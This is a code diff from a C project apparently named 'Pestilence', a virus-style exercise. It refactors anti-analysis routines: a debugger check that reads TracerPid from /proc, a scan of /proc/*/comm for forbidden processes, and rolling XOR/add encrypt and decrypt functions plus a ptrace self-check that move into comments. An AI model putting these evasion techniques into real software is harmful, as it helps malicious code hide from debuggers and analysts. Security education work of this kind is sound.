@@ -36,40 +36,6 @@ void encrypt(uint8_t *data, const size_t size, uint64_t key) {
 	}
 }
 
-void encrypt_rol(uint8_t *data, const size_t size, uint64_t key) {
-	for (size_t i = 0; i < size; i++) {
-		//data[i] ^= (key >> (8 * (i % 8))) & 0xFF;
-		uint8_t k = (key >> (8 * (i % 8))) & 0xFF;
-
-		data[i] ^= k;
-		data[i] += k;
-
-		key = (key >> 7) | (key << (64 - 7));
-		key ^= 0x9e3779b97f4a7c15;
-
-	}
-}
-
-void decrypt_rol(uint8_t *data, const size_t size, uint64_t key) {
-	for (size_t i = 0; i < size; i++) {
-		uint8_t k = (key >> (8 * (i % 8))) & 0xFF;
-
-		data[i] -= k;
-		data[i] ^= k;
-
-		key = (key >> 7) | (key << (64 - 7));
-		key ^= 0x9e3779b97f4a7c15;
-	}
-}
-
-
-static int	check_ptrace(void)
-{
-	if (_syscall(SYS_ptrace, PTRACE_TRACEME, 0, 0, 0) == -1)
-		return (1);
-	return (0);
-}
-
 /* open /proc/ directory and check if the process in char forbidden[] is running 
  * example /proc/1/comm
  */
@@ -150,10 +116,11 @@ static int forbid_proc(void)
 				char comm[] = "/comm";
 				char slash[] = "/";
 
-				ft_strcpy(new_path, proc);
-				ft_strlcat(new_path, slash, PATH_MAX);
-				ft_strlcat(new_path, dir->d_name, PATH_MAX);
-				ft_strlcat(new_path, comm, PATH_MAX);
+				char *ptr = new_path;
+				ptr = ft_stpncpy(ptr, proc, PATH_MAX);
+				ptr = ft_stpncpy(ptr, slash, PATH_MAX - (ptr - new_path));
+				ptr = ft_stpncpy(ptr, dir->d_name, PATH_MAX - (ptr - new_path));
+				ptr = ft_stpncpy(ptr, comm, PATH_MAX - (ptr - new_path));
 
 				if (check_proc(new_path) != 0) {
 					_syscall(SYS_close, fd);
@@ -178,25 +145,18 @@ int is_debugged(void) {
 
 	char buf[4096];
 
-	while (1) {
-		ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
-		if (ret == -1) {
-			res = 1;
-			break;
-		}
-		if (ret == 0)
-			break;
-		buf[ret] = '\0';
+	ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
+	if (ret == -1) 
+		return 1;
+	buf[ret] = '\0';
 
-		char *ptr = ft_memmem(buf, ret, ((char []){"TracerPid:"}), 10);
-		if (ptr != 0) {
-			ptr += 10;
-			while (*ptr == ' ' || *ptr == '\t')
-				ptr++;
-			if (*ptr != '0') {
-				res = 1;
-				break;
-			}
+	char *ptr = ft_memmem(buf, ret, ((char []){"TracerPid:"}), 10);
+	if (ptr != 0) {
+		ptr += 10;
+		while (*ptr == ' ' || *ptr == '\t')
+			ptr++;
+		if (*ptr != '0') {
+			res = 1;
 		}
 	}
 
@@ -206,10 +166,41 @@ int is_debugged(void) {
 
 int pestilence(void)
 {
-	if (is_debugged() != 0) {
-		return 1;
-	}
-	if (forbid_proc() != 0)
+	if (is_debugged() != 0 || forbid_proc() != 0)
 		return 1;
 	return 0;
 }
+
+//void encrypt_rol(uint8_t *data, const size_t size, uint64_t key) {
+//	for (size_t i = 0; i < size; i++) {
+//		//data[i] ^= (key >> (8 * (i % 8))) & 0xFF;
+//		uint8_t k = (key >> (8 * (i % 8))) & 0xFF;
+//
+//		data[i] ^= k;
+//		data[i] += k;
+//
+//		key = (key >> 7) | (key << (64 - 7));
+//		key ^= 0x9e3779b97f4a7c15;
+//
+//	}
+//}
+//
+//void decrypt_rol(uint8_t *data, const size_t size, uint64_t key) {
+//	for (size_t i = 0; i < size; i++) {
+//		uint8_t k = (key >> (8 * (i % 8))) & 0xFF;
+//
+//		data[i] -= k;
+//		data[i] ^= k;
+//
+//		key = (key >> 7) | (key << (64 - 7));
+//		key ^= 0x9e3779b97f4a7c15;
+//	}
+//}
+
+
+//static int	check_ptrace(void)
+//{
+//	if (_syscall(SYS_ptrace, PTRACE_TRACEME, 0, 0, 0) == -1)
+//		return (1);
+//	return (0);
+//}
